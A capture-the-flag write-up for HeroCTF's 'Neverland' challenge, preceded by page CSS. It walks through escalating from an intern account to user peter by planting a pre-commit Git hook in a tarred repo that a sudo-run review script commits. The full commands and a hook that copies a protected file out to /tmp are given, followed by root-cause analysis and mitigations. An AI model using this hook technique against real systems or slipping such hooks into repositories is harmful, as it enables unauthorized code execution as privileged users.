<style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>

# HeroCTF – Neverland (Misc, Easy)

## Challenge Information

- **Name:** Neverland  
- **CTF:** HeroCTF  
- **Category:** Misc  
- **Difficulty:** Easy  
- **Points:** 50  
- **Host:** `dyn11.heroctf.fr`  
- **Port:** `14721`  
- **Deployment portal:** `https://deploy.heroctf.fr`  
- **SSH credentials:** `intern:fairy`  
- **Flag format:** `^Hero{\S+}$` (e.g. `Hero{...}`)  
- **Author:** Log_s  

---

## Scenario

> Peter Pan and Captain Hook are once again fighting in Neverland, instead of working and
> pushing PRs into production. Since this is a regular occurrence, we have created a script
> that allows the intern to review PRs in their stead. Please don't touch Peter's fairy powder
> stock in `/home/peter/flag.txt`…

As **intern**, we’re given SSH access to a box where Peter (a more privileged user) owns the flag.
Our goal is to escalate from `intern` to reading `/home/peter/flag.txt`.

---

## Foothold – SSH Access

We’re given direct SSH credentials:

```bash
ssh -p 14721 intern@dyn11.heroctf.fr
# password: fairy
```

Once logged in as `intern`, we start with the usual privilege enumeration.

---

## Privilege Enumeration

Check sudo permissions:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for intern on this host:
    ...

User intern may run the following commands on this host:
    (peter) /opt/commit.sh
```

So as `intern` we can run **one** command as user `peter`:

```bash
sudo -u peter /opt/commit.sh <args>
```

This is our privilege-escalation vector.

---

## Understanding `/opt/commit.sh`

Reading `/opt/commit.sh` (or tracing its behaviour) shows that it:

1. Takes a tar archive path as an argument.  
2. Extracts the archive into a temporary directory belonging to `peter`, something like:  
   `/home/peter/git-review-$$/repo`
3. Enters the extracted `repo` directory.
4. Performs two integrity checks to make sure it’s based on the official repo in `/app`:
   - The `HEAD` commit hash must match the one in `/app/.git/HEAD`.
   - The `.git/config` file hash must match `/app/.git/config`.
5. If both checks pass, it runs:

   ```bash
   git add .
   git commit -m "Accepted user submission"
   ```

The important insight: **Git executes hooks (from `.git/hooks/*`) as the user running Git.**  
Here, Git runs as **peter**, so any hook we provide will execute with **peter’s permissions**.

Crucially, **Git hooks are not part of the commit hash and are not tracked by Git**, so the script’s
integrity checks do **not** cover `.git/hooks/`. That means we can:

- Use a legit repo so that `HEAD` and `.git/config` match `/app`.
- Slip in a malicious hook under `.git/hooks/`.
- Have the script call `git commit`, which triggers the hook as `peter`.

---

## Exploitation Plan

1. Copy the official repo from `/app` so our repo passes the integrity checks.
2. Add a malicious **pre-commit** hook that reads `/home/peter/flag.txt` and writes it to a
   location readable by `intern` (e.g., `/tmp/neverland_flag.txt`).
3. Tar the repo.
4. Run `/opt/commit.sh` as `peter` with our tar archive.
5. Read the exfiltrated flag as `intern`.

---

## Step-by-Step Exploit

### Step 1 – Copy the official repository

From `intern`’s home:

```bash
cd ~
cp -r /app repo
cd repo
```

Now `./repo` is a copy of the official repository in `/app`, including its `.git` directory.
This ensures our `HEAD` and `.git/config` will match the expected values.

---

### Step 2 – Create a malicious Git hook

We’ll use a **pre-commit** hook that runs just before `git commit` completes.
The hook will copy the flag into a world-readable file under `/tmp`.

```bash
mkdir -p .git/hooks

cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
cat /home/peter/flag.txt > /tmp/neverland_flag.txt
chmod 644 /tmp/neverland_flag.txt
exit 0
EOF

chmod +x .git/hooks/pre-commit
```

What this does:

- `cat /home/peter/flag.txt > /tmp/neverland_flag.txt`  
  → reads the flag as **peter** (when the hook runs) and writes it to `/tmp`.
- `chmod 644 /tmp/neverland_flag.txt`  
  → makes the file world-readable so the `intern` user can read it.
- `exit 0`  
  → ensures the commit continues successfully.

Because `.git/hooks` is not covered by Git’s integrity mechanisms, the script’s checks will still pass.

---

### Step 3 – Package the repo

Go back to the home directory and tar the repo:

```bash
cd ~
tar -czf repo.tar.gz repo
```

This creates `~/repo.tar.gz`, containing our valid repo + malicious hook.

---

### Step 4 – Run the commit script as `peter`

Now we invoke the privileged script with our archive:

```bash
sudo -u peter /opt/commit.sh /home/intern/repo.tar.gz
```

What happens behind the scenes:

1. The script extracts `repo.tar.gz` into a temporary review directory as `peter`.
2. It verifies the `HEAD` commit and `.git/config` match `/app` → they do, because we copied `/app`.
3. It runs:

   ```bash
   git add .
   git commit -m "Accepted user submission"
   ```

4. `git commit` triggers our `pre-commit` hook **as peter**.
5. The hook copies the flag into `/tmp/neverland_flag.txt` with mode `644`.

---

### Step 5 – Read the flag as `intern`

Back as `intern`, simply read the file from `/tmp`:

```bash
cat /tmp/neverland_flag.txt
```

This prints the flag:

```text
Hero{redacted_flag_here}
```

Replace the placeholder with the actual flag you obtained during the CTF.

---

## Root Cause & Takeaways

**Root issue:**

- The script allows an untrusted user (`intern`) to supply a **full Git repository** and then
  runs `git commit` as a more privileged user (`peter`) without sanitising or regenerating the
  `.git` directory.
- Git hooks in `.git/hooks/` are **executable code not protected by commit hashes or config checks**.
- Therefore, the attacker can smuggle arbitrary code to be executed as `peter`.

**Key lessons:**

- Never run VCS commands (`git`, etc.) on user-controlled repositories as a higher-privileged user
  without extreme care.
- If you must do this:
  - Consider running in a locked-down environment (container, chroot, non-privileged service user).
  - Re-initialise `.git` yourself and only copy over the *working tree* (no hooks or metadata).
  - Disable hooks explicitly, e.g.:

    ```bash
    git -c core.hooksPath=/dev/null commit ...
    ```

- Always treat tarballs and archives from untrusted users as potentially malicious.

